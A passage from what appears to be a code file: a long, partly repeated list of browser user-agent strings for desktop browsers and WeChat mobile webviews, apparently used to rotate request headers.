     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
	 "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
	 "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
	 "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
	 "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
	 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
	 "Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
